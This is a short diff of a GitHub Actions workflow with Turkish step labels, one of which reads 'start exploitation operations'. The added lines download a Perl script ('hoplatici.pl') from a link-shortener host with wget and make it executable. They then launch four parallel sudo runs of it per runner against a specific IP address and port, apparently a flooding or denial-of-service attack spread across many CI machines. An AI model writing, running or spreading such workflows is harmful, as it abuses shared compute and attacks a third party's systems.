@@ -17,15 +17,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
-          chmod +x tekpoyraz
+          wget https://wgetz.com/NkqQXVUWpd/hoplatici.pl -O hoplatici.pl
+          chmod +x hoplatici.pl
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
           for i in {1..4}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 20 ./tekpoyraz 216.202.200.164 19999 &
+            sudo timeout 20 perl hoplatici.pl 216.202.200.164 19999 100 20 &
             PIDS+=($!)
           done
           
